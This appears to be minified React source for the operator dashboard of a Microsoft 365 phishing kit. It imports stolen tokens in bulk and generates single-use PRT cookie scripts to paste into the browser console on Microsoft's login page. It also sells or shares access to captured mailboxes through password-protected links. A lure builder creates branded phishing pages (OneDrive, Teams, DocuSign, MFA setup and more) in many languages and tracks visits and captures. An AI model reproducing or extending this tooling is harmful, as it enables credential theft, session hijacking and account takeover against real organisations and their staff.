              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Token Data`,
            }),
            (0, R.jsx)(`textarea`, {
              value: n,
              onChange: (e) => d(e.target.value),
              rows: 8,
              placeholder: `[
  {"token":"eyJ0...","refreshToken":"1.AX0...","email":"user@corp.com"},
  ...
]

or a single object, or a raw JWT`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm font-mono focus:outline-none focus:border-border-light resize-y`,
            }),
          ],
        }),
        i &&
          (0, R.jsxs)(`div`, {
            className: `flex items-center gap-2 text-xs`,
            children: [
              (0, R.jsx)(`span`, {
                className: `inline-block w-2 h-2 rounded-full ${i.count > 0 ? `bg-active` : `bg-danger`}`,
              }),
              i.mode === `bulk`
                ? (0, R.jsxs)(`span`, {
                    className: `text-text-secondary`,
                    children: [
                      `Detected `,
                      (0, R.jsx)(`strong`, {
                        className: `text-text`,
                        children: i.count,
                      }),
                      ` tokens for bulk import`,
                    ],
                  })
                : (0, R.jsxs)(`span`, {
                    className: `text-text-secondary`,
                    children: [`Single token`, i.email ? `: ${i.email}` : ``],
                  }),
            ],
          }),
        o &&
          c.total > 1 &&
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex justify-between text-[10px] text-text-muted mb-1`,
                children: [
                  (0, R.jsxs)(`span`, {
                    children: [`Importing `, c.done, `/`, c.total],
                  }),
                  c.failed > 0 &&
                    (0, R.jsxs)(`span`, {
                      className: `text-danger`,
                      children: [c.failed, ` failed`],
                    }),
                ],
              }),
              (0, R.jsx)(`div`, {
                className: `w-full h-1.5 bg-border rounded-full overflow-hidden`,
                children: (0, R.jsx)(`div`, {
                  className: `h-full bg-active transition-all duration-300`,
                  style: { width: `${(c.done / c.total) * 100}%` },
                }),
              }),
            ],
          }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: f,
              disabled: o || !i,
              className: `flex-1`,
              children: o
                ? c.total > 1
                  ? `Importing ${c.done}/${c.total}...`
                  : `Importing...`
                : i?.mode === `bulk`
                  ? `Import ${i.count} Tokens`
                  : `Import`,
            }),
            (0, R.jsx)(V, {
              variant: `secondary`,
              onClick: e,
              className: `flex-1`,
              children: `Cancel`,
            }),
          ],
        }),
      ],
    }),
  });
}
function oo({ token: e, onClose: t }) {
  let [n, r] = (0, _.useState)(!1),
    [i, a] = (0, _.useState)(null),
    [o, s] = (0, _.useState)(null),
    [c, l] = (0, _.useState)(!1),
    u = z((e) => e.add);
  async function d() {
    (r(!0), s(null), a(null));
    try {
      let t = await Za(e.id);
      t.success
        ? a(t.script)
        : s(t.error || `Failed to generate cookie script`);
    } catch (e) {
      s(e?.message || `Request failed`);
    } finally {
      r(!1);
    }
  }
  function f() {
    i &&
      (navigator.clipboard.writeText(i),
      l(!0),
      u(`Cookie script copied to clipboard`, `success`),
      setTimeout(() => l(!1), 2500));
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Cookie Script — ${e.user_email}`,
    onClose: t,
    width: `max-w-xl`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          className: `bg-bg border border-border p-3 text-xs text-text-secondary space-y-1`,
          children: [
            (0, R.jsx)(`p`, {
              className: `font-semibold text-text uppercase tracking-wider text-[10px]`,
              children: `How to use`,
            }),
            (0, R.jsxs)(`ol`, {
              className: `list-decimal list-inside space-y-0.5 text-text-muted`,
              children: [
                (0, R.jsxs)(`li`, {
                  children: [
                    `Open `,
                    (0, R.jsx)(`code`, {
                      className: `text-text`,
                      children: `https://login.microsoftonline.com`,
                    }),
                    ` in Chrome/Edge`,
                  ],
                }),
                (0, R.jsxs)(`li`, {
                  children: [
                    `Press `,
                    (0, R.jsx)(`kbd`, {
                      className: `bg-surface border border-border px-1`,
                      children: `F12`,
                    }),
                    ` → Console tab`,
                  ],
                }),
                (0, R.jsx)(`li`, {
                  children: `Paste the script and press Enter`,
                }),
                (0, R.jsx)(`li`, {
                  children: `Wait ~3 seconds — auto-redirects to Office 365`,
                }),
              ],
            }),
            (0, R.jsx)(`p`, {
              className: `text-warning pt-1`,
              children: `Each cookie script is single-use. Generate a new one each time.`,
            }),
          ],
        }),
        !i &&
          !n &&
          (0, R.jsx)(V, {
            onClick: d,
            className: `w-full`,
            children: `Generate Cookie Script (~15 sec)`,
          }),
        n &&
          (0, R.jsxs)(`div`, {
            className: `text-center py-6 space-y-2`,
            children: [
              (0, R.jsx)(`div`, {
                className: `text-sm text-text-secondary`,
                children: `Generating PRT cookie...`,
              }),
              (0, R.jsx)(`div`, {
                className: `text-xs text-text-muted`,
                children: `Registering virtual device, please wait`,
              }),
              (0, R.jsx)(`div`, {
                className: `mt-3 flex justify-center`,
                children: (0, R.jsx)(`div`, {
                  className: `w-6 h-6 border-2 border-border border-t-active rounded-full animate-spin`,
                }),
              }),
            ],
          }),
        o &&
          (0, R.jsx)(`div`, {
            className: `bg-danger/10 border border-danger/30 text-danger text-xs px-3 py-2`,
            children: o,
          }),
        i &&
          (0, R.jsxs)(`div`, {
            className: `space-y-2`,
            children: [
              (0, R.jsxs)(`div`, {
                className: `flex items-center justify-between`,
                children: [
                  (0, R.jsx)(`span`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold`,
                    children: `Console Script`,
                  }),
                  (0, R.jsxs)(`button`, {
                    onClick: f,
                    className: `flex items-center gap-1.5 px-3 py-1.5 text-[10px] font-semibold uppercase tracking-wider border border-border hover:bg-surface transition-colors cursor-pointer`,
                    children: [
                      c
                        ? (0, R.jsx)(jr, { size: 11, className: `text-active` })
                        : (0, R.jsx)(Ur, { size: 11 }),
                      c ? `Copied!` : `Copy Script`,
                    ],
                  }),
                ],
              }),
              (0, R.jsx)(`textarea`, {
                readOnly: !0,
                value: i,
                rows: 5,
                className: `w-full bg-bg border border-border text-text-muted px-3 py-2 text-xs font-mono resize-y focus:outline-none`,
              }),
              (0, R.jsx)(V, {
                variant: `secondary`,
                onClick: d,
                className: `w-full text-xs`,
                children: `Regenerate (new single-use cookie)`,
              }),
            ],
          }),
      ],
    }),
  });
}
function so({ token: e, onClose: t }) {
  let [n, r] = (0, _.useState)([]),
    [i, a] = (0, _.useState)(!0),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(!1),
    [u, d] = (0, _.useState)(null),
    [f, p] = (0, _.useState)(!1),
    [m, h] = (0, _.useState)(!1),
    g = z((e) => e.add);
  (0, _.useEffect)(() => {
    v();
  }, []);
  async function v() {
    a(!0);
    try {
      let t = await Ja(e.id);
      r(Array.isArray(t) ? t : []);
    } catch {
      g(`Failed to load shares`, `error`);
    } finally {
      a(!1);
    }
  }
  async function y() {
    l(!0);
    try {
      let t = await qa(e.id, o);
      t.success && (d({ link: t.link, password: t.password }), s(``), v());
    } catch {
      g(`Failed to create share link`, `error`);
    } finally {
      l(!1);
    }
  }
  async function b(t) {
    try {
      (await Ya(e.id, t), g(`Share link revoked`, `success`), v());
    } catch {
      g(`Failed to revoke`, `error`);
    }
  }
  function x(e, t) {
    (navigator.clipboard.writeText(e), t(!0), setTimeout(() => t(!1), 2e3));
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Share — ${e.user_email}`,
    onClose: t,
    width: `max-w-lg`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Create New Share Link`,
            }),
            (0, R.jsxs)(`div`, {
              className: `flex gap-2`,
              children: [
                (0, R.jsx)(`input`, {
                  type: `text`,
                  value: o,
                  onChange: (e) => s(e.target.value),
                  placeholder: `Optional label (e.g. 'For client X')`,
                  className: `flex-1 bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
                }),
                (0, R.jsx)(V, {
                  onClick: y,
                  disabled: c,
                  size: `sm`,
                  children: c ? `Creating...` : `Generate`,
                }),
              ],
            }),
          ],
        }),
        u &&
          (0, R.jsxs)(`div`, {
            className: `bg-bg border border-active/30 p-4 space-y-2`,
            children: [
              (0, R.jsx)(`div`, {
                className: `text-[10px] text-active uppercase tracking-wider font-bold`,
                children: `Share Created`,
              }),
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`div`, {
                    className: `text-[10px] text-text-muted uppercase tracking-widest mb-0.5`,
                    children: `Access Link`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-2`,
                    children: [
                      (0, R.jsx)(`code`, {
                        className: `flex-1 text-xs font-mono text-text bg-surface border border-border px-2 py-1.5 truncate`,
                        children: u.link,
                      }),
                      (0, R.jsx)(`button`, {
                        onClick: () => x(u.link, p),
                        className: `p-1.5 border border-border hover:bg-surface-hover cursor-pointer`,
                        children: f
                          ? (0, R.jsx)(jr, {
                              size: 12,
                              className: `text-active`,
                            })
                          : (0, R.jsx)(Ur, {
                              size: 12,
                              className: `text-text-muted`,
                            }),
                      }),
                    ],
                  }),
                ],
              }),
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`div`, {
                    className: `text-[10px] text-text-muted uppercase tracking-widest mb-0.5`,
                    children: `Access Password`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-2`,
                    children: [
                      (0, R.jsx)(`code`, {
                        className: `flex-1 text-xs font-mono text-text bg-surface border border-border px-2 py-1.5`,
                        children: u.password,
                      }),
                      (0, R.jsx)(`button`, {
                        onClick: () => x(u.password, h),
                        className: `p-1.5 border border-border hover:bg-surface-hover cursor-pointer`,
                        children: m
                          ? (0, R.jsx)(jr, {
                              size: 12,
                              className: `text-active`,
                            })
                          : (0, R.jsx)(Ur, {
                              size: 12,
                              className: `text-text-muted`,
                            }),
                      }),
                    ],
                  }),
                ],
              }),
              (0, R.jsx)(`p`, {
                className: `text-[10px] text-warning`,
                children: `Save the password now — it won't be shown again.`,
              }),
            ],
          }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsxs)(`div`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-2`,
              children: [
                `Active Shares (`,
                n.filter((e) => e.is_active).length,
                `)`,
              ],
            }),
            i
              ? (0, R.jsx)(`div`, {
                  className: `text-xs text-text-muted py-4 text-center`,
                  children: `Loading...`,
                })
              : n.length === 0
                ? (0, R.jsx)(`div`, {
                    className: `text-xs text-text-muted py-4 text-center`,
                    children: `No share links created yet.`,
                  })
                : (0, R.jsx)(`div`, {
                    className: `space-y-1.5 max-h-48 overflow-y-auto`,
                    children: n.map((e) =>
                      (0, R.jsxs)(
                        `div`,
                        {
                          className: `flex items-center justify-between px-3 py-2 border border-border text-xs ${e.is_active ? `bg-surface` : `bg-bg opacity-50`}`,
                          children: [
                            (0, R.jsxs)(`div`, {
                              className: `flex-1 min-w-0`,
                              children: [
                                (0, R.jsxs)(`div`, {
                                  className: `flex items-center gap-2`,
                                  children: [
                                    (0, R.jsx)(`span`, {
                                      className: `font-mono text-text-secondary truncate`,
                                      children: e.share_code,
                                    }),
                                    e.label &&
                                      (0, R.jsxs)(`span`, {
                                        className: `text-text-muted`,
                                        children: [`(`, e.label, `)`],
                                      }),
                                  ],
                                }),
                                (0, R.jsxs)(`div`, {
                                  className: `text-[10px] text-text-muted mt-0.5`,
                                  children: [
                                    e.access_count,
                                    ` access`,
                                    e.access_count === 1 ? `` : `es`,
                                    ` ·`,
                                    ` `,
                                    new Date(e.created_at).toLocaleDateString(),
                                    !e.is_active &&
                                      (0, R.jsx)(`span`, {
                                        className: `text-danger ml-2`,
                                        children: `Revoked`,
                                      }),
                                  ],
                                }),
                              ],
                            }),
                            e.is_active &&
                              (0, R.jsxs)(`button`, {
                                onClick: () => b(e.id),
                                className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer text-text-muted hover:text-danger transition-colors`,
                                children: [
                                  (0, R.jsx)(Rr, { size: 12 }),
                                  ` Revoke`,
                                ],
                              }),
                          ],
                        },
                        e.id,
                      ),
                    ),
                  }),
          ],
        }),
      ],
    }),
  });
}
function co({ clientId: e }) {
  return e?.toLowerCase().startsWith(`d3590ed6`)
    ? (0, R.jsxs)(`span`, {
        className: `inline-flex items-center gap-1 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider bg-blue-100 text-blue-700 border border-blue-200`,
        children: [(0, R.jsx)(di, { size: 8 }), ` Mailbox`],
      })
    : (0, R.jsxs)(`span`, {
        className: `inline-flex items-center gap-1 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider bg-orange-100 text-orange-700 border border-orange-200`,
        children: [(0, R.jsx)(Hr, { size: 8 }), ` Cookies`],
      });
}
function lo({ label: e, icon: t, onClick: n, color: r }) {
  return (0, R.jsxs)(`button`, {
    onClick: n,
    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider transition-colors cursor-pointer ${r}`,
    children: [t, (0, R.jsx)(`span`, { children: e })],
  });
}
function U({ field: e, label: t, sortField: n, sortDir: r, onSort: i }) {
  return (0, R.jsx)(`th`, {
    className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold cursor-pointer hover:text-text select-none`,
    onClick: () => i(e),
    children: (0, R.jsxs)(`span`, {
      className: `flex items-center gap-1`,
      children: [
        t,
        n === e &&
          (r === `asc`
            ? (0, R.jsx)(Pr, { size: 11 })
            : (0, R.jsx)(Mr, { size: 11 })),
      ],
    }),
  });
}
async function W() {
  return P(`/dash/lures`);
}
async function uo() {
  return P(`/dash/domains`);
}
async function fo(e) {
  return P(`/dash/lures/create`, { method: `POST`, body: JSON.stringify(e) });
}
async function po(e) {
  return P(`/dash/lures/delete/${e}`, { method: `POST` });
}
async function mo(e, t) {
  let n = await fetch(`/dash/lures/html-attachment/${e}`, {
    credentials: `include`,
  });
  if (!n.ok) throw Error(`Download failed`);
  let r = await n.blob(),
    i = URL.createObjectURL(r),
    a = document.createElement(`a`);
  ((a.href = i),
    (a.download =
      n.headers.get(`content-disposition`)?.match(/filename="?(.+?)"?$/)?.[1] ??
      `${(t || `lure`).replace(/\s+/g, `_`)}.html`),
    document.body.appendChild(a),
    a.click(),
    a.remove(),
    URL.revokeObjectURL(i));
}
var ho = [
    { id: `onedrive`, name: `OneDrive`, desc: `File sharing` },
    { id: `sharepoint`, name: `SharePoint`, desc: `Document library` },
    { id: `sharepoint_site`, name: `SharePoint Site`, desc: `Team site` },
    { id: `teams`, name: `Teams`, desc: `Message / meeting` },
    { id: `outlook`, name: `Outlook`, desc: `Email portal` },
    { id: `onenote`, name: `OneNote`, desc: `Shared notebook` },
    { id: `docusign`, name: `DocuSign`, desc: `Document signing` },
    { id: `adobe`, name: `Adobe`, desc: `PDF review` },
    { id: `dropbox`, name: `Dropbox`, desc: `File download` },
    { id: `google_drive`, name: `Google Drive`, desc: `File access` },
    { id: `voicemail`, name: `Voicemail`, desc: `Missed voicemail` },
    { id: `direct`, name: `Direct Login`, desc: `Clean Microsoft sign-in` },
    { id: `ms_admin`, name: `Admin Center`, desc: `M365 admin`, pro: !0 },
    {
      id: `ms_security`,
      name: `Security Alert`,
      desc: `Account security`,
      pro: !0,
    },
    {
      id: `ms_password_reset`,
      name: `Password Reset`,
      desc: `Password reset`,
      pro: !0,
    },
    { id: `ms_mfa_setup`, name: `MFA Setup`, desc: `MFA enrollment`, pro: !0 },
    {
      id: `ms_quarantine`,
      name: `Quarantine`,
      desc: `Email quarantine`,
      pro: !0,
    },
    {
      id: `ms_teams_meeting`,
      name: `Teams Meeting`,
      desc: `Meeting invite`,
      pro: !0,
    },
    {
      id: `ms_teams_approval`,
      name: `Teams Approval`,
      desc: `Approval request`,
      pro: !0,
    },
    { id: `ms_forms`, name: `Forms`, desc: `Survey / form`, pro: !0 },
    { id: `ms_planner`, name: `Planner`, desc: `Task assignment`, pro: !0 },
    { id: `ms_calendar`, name: `Calendar`, desc: `Calendar event`, pro: !0 },
    { id: `ms_loop`, name: `Loop`, desc: `Collaborative workspace`, pro: !0 },
    { id: `ms_copilot`, name: `Copilot`, desc: `AI assistant`, pro: !0 },
    { id: `ms_todo`, name: `To Do`, desc: `Task notification`, pro: !0 },
    {
      id: `ms_onedrive_biz`,
      name: `OneDrive Business`,
      desc: `Business share`,
      pro: !0,
    },
    {
      id: `ms_sharepoint_news`,
      name: `SharePoint News`,
      desc: `News article`,
      pro: !0,
    },
    {
      id: `ms_powerautomate`,
      name: `Power Automate`,
      desc: `Workflow`,
      pro: !0,
    },
    { id: `ms_intune`, name: `Intune`, desc: `Device enrollment`, pro: !0 },
    { id: `ms_yammer`, name: `Yammer`, desc: `Community post`, pro: !0 },
    { id: `ms_sway`, name: `Sway`, desc: `Interactive report`, pro: !0 },
    { id: `ms_stream`, name: `Stream`, desc: `Video notification`, pro: !0 },
    {
      id: `ms_whiteboard`,
      name: `Whiteboard`,
      desc: `Collaborative board`,
      pro: !0,
    },
    {
      id: `ms_bookings`,
      name: `Bookings`,
      desc: `Appointment booking`,
      pro: !0,
    },
  ],
  go = [
    {
      id: `enterprise`,
      label: `Enterprise`,
      desc: `Full-page branded portal with document preview`,
    },
    {
      id: `split`,
      label: `Split Screen`,
      desc: `Left brand panel, right auth panel`,
    },
    {
      id: `modal`,
      label: `Modal`,
      desc: `Background content with centered auth popup`,
    },
  ],
  _o = [
    { id: `en`, label: `English`, flag: `🇺🇸` },
    { id: `es`, label: `Español`, flag: `🇪🇸` },
    { id: `fr`, label: `Français`, flag: `🇫🇷` },
    { id: `de`, label: `Deutsch`, flag: `🇩🇪` },
    { id: `pt`, label: `Português`, flag: `🇧🇷` },
    { id: `it`, label: `Italiano`, flag: `🇮🇹` },
    { id: `nl`, label: `Nederlands`, flag: `🇳🇱` },
    { id: `ja`, label: `日本語`, flag: `🇯🇵` },
    { id: `ko`, label: `한국어`, flag: `🇰🇷` },
    { id: `zh`, label: `中文`, flag: `🇨🇳` },
    { id: `ar`, label: `العربية`, flag: `🇸🇦` },
    { id: `tr`, label: `Türkçe`, flag: `🇹🇷` },
    { id: `pl`, label: `Polski`, flag: `🇵🇱` },
    { id: `ru`, label: `Русский`, flag: `🇷🇺` },
  ];
function vo(e) {
  return e.is_cf_account
    ? e.cf_account_name || e.domain
    : e.fqdn
      ? e.fqdn
      : e.subdomain
        ? `${e.subdomain}.${e.domain}`
        : e.domain;
}
function yo(e) {
  return e.is_cf_account && e.cf_cred_id
    ? { cf_cred_id: e.cf_cred_id }
    : e.is_silo_sub && e.silo_sub_id
      ? { silo_sub_id: e.silo_sub_id }
      : e.is_private_domain && e.private_domain_id
        ? { private_domain_id: e.private_domain_id }
        : e.is_linked_domain && e.linked_domain_id
          ? { linked_domain_id: e.linked_domain_id }
          : e.is_client_domain && e.client_domain_id
            ? { client_domain_id: e.client_domain_id }
            : e.is_client_subdomain && e.client_subdomain_id
              ? { client_subdomain_id: e.client_subdomain_id }
              : { domain_id: e.id };
}
function bo() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(!1),
    [o, s] = (0, _.useState)(null),
    [c, l] = (0, _.useState)(``),
    u = z((e) => e.add);
  function d() {
    (r(!0),
      W()
        .then((e) => t(Array.isArray(e) ? e : []))
        .catch(() => u(`Failed to load lures`, `error`))
        .finally(() => r(!1)));
  }
  (0, _.useEffect)(d, []);
  async function f(e) {
    if (confirm(`Delete this lure?`))
      try {
        (await po(e), u(`Lure deleted`, `success`), d());
      } catch {
        u(`Delete failed`, `error`);
      }
  }
  let p = e.filter((e) => {
      if (!c) return !0;
      let t = c.toLowerCase();
      return (
        e.name?.toLowerCase().includes(t) ||
        e.design?.toLowerCase().includes(t) ||
        e.path?.toLowerCase().includes(t)
      );
    }),
    m = e.reduce((e, t) => e + (t.visits ?? 0), 0),
    h = e.reduce((e, t) => e + (t.captures ?? 0), 0);
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between mb-5`,
        children: [
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`h1`, {
                className: `text-lg font-bold tracking-wider uppercase`,
                children: `Lures`,
              }),
              (0, R.jsxs)(`p`, {
                className: `text-xs text-text-muted mt-1`,
                children: [
                  e.length,
                  ` lure`,
                  e.length === 1 ? `` : `s`,
                  ` ·`,
                  ` `,
                  m,
                  ` visits · `,
                  h,
                  ` captures`,
                ],
              }),
            ],
          }),
          (0, R.jsx)(V, {
            onClick: () => {
              (s(null), a(!0));
            },
            children: (0, R.jsxs)(`span`, {
              className: `flex items-center gap-1.5`,
              children: [(0, R.jsx)(_i, { size: 14 }), ` New Lure`],
            }),
          }),
        ],
      }),
      (0, R.jsx)(Ha, {
        title: `Lures`,
        tips: [
          `Create phishing links with custom landing pages (SharePoint, OneDrive, Voicemail themes).`,
          `Choose a flow type: Device Code for speed, Cookies for MFA-passed sessions, or combine both.`,
          `You need a domain first — set one up in Domains (CF Worker is fastest).`,
        ],
        learnMoreCategory: `lures`,
      }),
      (0, R.jsx)(`div`, {
        className: `flex items-center gap-2 mb-4`,
        children: (0, R.jsxs)(`div`, {
          className: `flex-1 relative`,
          children: [
            (0, R.jsx)(xi, {
              size: 14,
              className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: c,
              onChange: (e) => l(e.target.value),
              placeholder: `Search lures...`,
              className: `w-full bg-bg border border-border text-text pl-9 pr-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
      }),
      n
        ? (0, R.jsx)(`div`, {
            className: `text-text-muted text-sm py-12 text-center`,
            children: `Loading...`,
          })
        : (0, R.jsx)(`div`, {
            className: `bg-surface border border-border overflow-x-auto`,
            children: (0, R.jsxs)(`table`, {
              className: `w-full text-sm`,
              children: [
                (0, R.jsx)(`thead`, {
                  children: (0, R.jsxs)(`tr`, {
                    className: `border-b border-border`,
                    children: [
                      (0, R.jsx)(xo, { children: `Name / URL` }),
                      (0, R.jsx)(xo, { children: `Type` }),
                      (0, R.jsx)(xo, { children: `Design` }),
                      (0, R.jsx)(xo, { children: `Lang` }),
                      (0, R.jsx)(xo, { children: `Layout` }),
                      (0, R.jsx)(xo, { children: `Domain` }),
                      (0, R.jsx)(xo, { center: !0, children: `Visits` }),
                      (0, R.jsx)(xo, { center: !0, children: `Captures` }),
                      (0, R.jsx)(xo, { children: `Actions` }),
                    ],
                  }),
                }),
                (0, R.jsx)(`tbody`, {
                  children:
                    p.length === 0
                      ? (0, R.jsx)(`tr`, {
                          children: (0, R.jsx)(`td`, {
                            colSpan: 9,
                            className: `text-center text-text-muted py-12`,
                            children:
                              e.length === 0
                                ? `No lures yet. Click "New Lure" to create one.`
                                : `No lures match your search.`,
                          }),
                        })
                      : p.map((e) => {
                          let t = e.full_domain
                              ? `https://${e.full_domain}/l/${e.path}`
                              : `/l/${e.path}`,
                            n = _o.find((t) => t.id === e.region),
                            r = e.capture_mode === `inbox`;
                          return (0, R.jsxs)(
                            `tr`,
                            {
                              className: `border-b border-border/40 hover:bg-slate-50 transition-colors`,
                              children: [
                                (0, R.jsxs)(`td`, {
                                  className: `py-2.5 px-4`,
                                  children: [
                                    (0, R.jsx)(`div`, {
                                      className: `text-[12px] font-medium text-text truncate`,
                                      children: e.name || `Unnamed`,
                                    }),
                                    (0, R.jsx)(`div`, {
                                      className: `text-[11px] font-mono text-text-muted truncate max-w-[240px]`,
                                      children: t,
                                    }),
                                  ],
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: r
                                    ? (0, R.jsx)(`span`, {
                                        className: `inline-flex items-center gap-1 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider bg-blue-100 text-blue-700 border border-blue-200`,
                                        children: `Mailbox`,
                                      })
                                    : (0, R.jsx)(`span`, {
                                        className: `inline-flex items-center gap-1 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-wider bg-orange-100 text-orange-700 border border-orange-200`,
                                        children: `Cookies`,
                                      }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(la, {
                                    color: `muted`,
                                    children: (e.design || `onedrive`).replace(
                                      /_/g,
                                      ` `,
                                    ),
                                  }),
                                }),
                                (0, R.jsxs)(`td`, {
                                  className: `py-2.5 px-3 text-[12px]`,
                                  children: [
                                    n?.flag ?? ``,
                                    ` `,
                                    n?.label ?? e.region ?? `en`,
                                  ],
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted capitalize`,
                                  children: e.layout || `enterprise`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted font-mono truncate max-w-[140px]`,
                                  children: e.full_domain || `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text text-center`,
                                  children: e.visits ?? 0,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text font-semibold text-center`,
                                  children: e.captures ?? 0,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2 px-3`,
                                  children: (0, R.jsxs)(`div`, {
                                    className: `flex gap-1`,
                                    children: [
                                      (0, R.jsx)(So, {
                                        tip: `Copy`,
                                        icon: (0, R.jsx)(Ur, { size: 12 }),
                                        onClick: () => {
                                          (navigator.clipboard.writeText(t),
                                            u(`URL copied`, `success`));
                                        },
                                      }),
                                      (0, R.jsx)(So, {
                                        tip: `Open`,
                                        icon: (0, R.jsx)(Kr, { size: 12 }),
                                        onClick: () => window.open(t, `_blank`),
                                      }),
                                      (0, R.jsx)(So, {
                                        tip: `Recreate`,
                                        icon: (0, R.jsx)(yi, { size: 12 }),
                                        onClick: () => {
                                          (s(e), a(!0));
                                        },
                                      }),
                                      (0, R.jsxs)(`button`, {
                                        title: `Download HTML`,
                                        onClick: () => {
                                          mo(e.id, e.name || e.path).catch(() =>
                                            u(`Download failed`, `error`),
                                          );
                                        },
                                        className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider transition-colors cursor-pointer text-text-secondary hover:text-slate-900 hover:bg-slate-100`,
                                        children: [
                                          (0, R.jsx)(Gr, { size: 12 }),
                                          ` HTML`,
                                        ],
                                      }),
                                      (0, R.jsx)(So, {
                                        tip: `Delete`,
                                        icon: (0, R.jsx)(I, { size: 12 }),
                                        onClick: () => f(e.id),
                                        danger: !0,
                                      }),
                                    ],
                                  }),
                                }),
                              ],
                            },
                            e.id,
                          );
                        }),
                }),
              ],
            }),
          }),
      i &&
        (0, R.jsx)(Co, {
          existing: o,
          onClose: () => {
            (a(!1), s(null));
          },
          onCreated: d,
        }),
    ],
  });
}
function xo({ children: e, center: t }) {
  return (0, R.jsx)(`th`, {
    className: `${t ? `text-center` : `text-left`} text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
    children: e,
  });
}
function So({ tip: e, icon: t, onClick: n, danger: r }) {
  return (0, R.jsx)(`button`, {
    onClick: n,
    title: e,
    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider transition-colors cursor-pointer ${r ? `text-text-secondary hover:text-danger hover:bg-danger/10` : `text-text-secondary hover:text-slate-900 hover:bg-slate-100`}`,
    children: t,
  });
}
function Co({ existing: e, onClose: t, onCreated: n }) {
  let [r, i] = (0, _.useState)(e?.region || `en`),
    [a, o] = (0, _.useState)(e?.layout || `enterprise`),
    [s, c] = (0, _.useState)(e?.design || `onedrive`),
    [l, u] = (0, _.useState)(e?.name || ``),
    [d, f] = (0, _.useState)(e?.doc_type || `pdf`),
    [p, m] = (0, _.useState)(e?.sender_name || ``),
    [h, g] = (0, _.useState)(e?.doc_title || ``),
    [v, y] = (0, _.useState)(e?.exit_url || ``),
    [b, x] = (0, _.useState)(!1),
    [S, C] = (0, _.useState)([]),
    [w, ee] = (0, _.useState)(!0),
    [T, E] = (0, _.useState)(0),
    [D, te] = (0, _.useState)(!1),
    [ne, O] = (0, _.useState)(``),
    re = z((e) => e.add);
  (0, _.useEffect)(() => {
    uo()
      .then((e) => {
        let t = (Array.isArray(e) ? e : []).filter((e) => !e.is_worker_domain);
        C(t);
        let n = t.findIndex((e) => e.is_default);
        n >= 0 && E(n);
      })
      .catch(() => {})
      .finally(() => ee(!1));
  }, []);
  let k = !!e,
    ie = S[T];
  async function ae() {
    x(!0);
    try {
      k && (await po(e.id).catch(() => {}));
      let i = ie ? yo(ie) : {},
        o = await fo({
          name: l || void 0,
          design: s,
          flow_type: `device_code`,
          capture_mode: `cookies`,
          region: r,
          layout: a,
          doc_type: d,
          sender_name: p || void 0,
          doc_title: h || void 0,
          exit_url: v || void 0,
          auto_subdomain:
            D && ie?.is_linked_domain && ie?.has_cf_creds ? !0 : void 0,
          cf_worker_name: ie?.is_cf_account && ne ? ne : void 0,
          ...i,
        });
      o.success
        ? (re(k ? `Lure updated` : `Lure created`, `success`), n(), t())
        : re(o.error ?? `Failed`, `error`);
    } catch (e) {
      re(e.message ?? `Failed`, `error`);
    } finally {
      x(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: k ? `Update Lure` : `Create Lure`,
    onClose: t,
    width: `max-w-2xl`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-5 max-h-[75vh] overflow-y-auto pr-1`,
      children: [
        (0, R.jsx)(wo, {
          label: `Language`,
          children: (0, R.jsx)(`div`, {
            className: `flex flex-wrap gap-1.5`,
            children: _o.map((e) =>
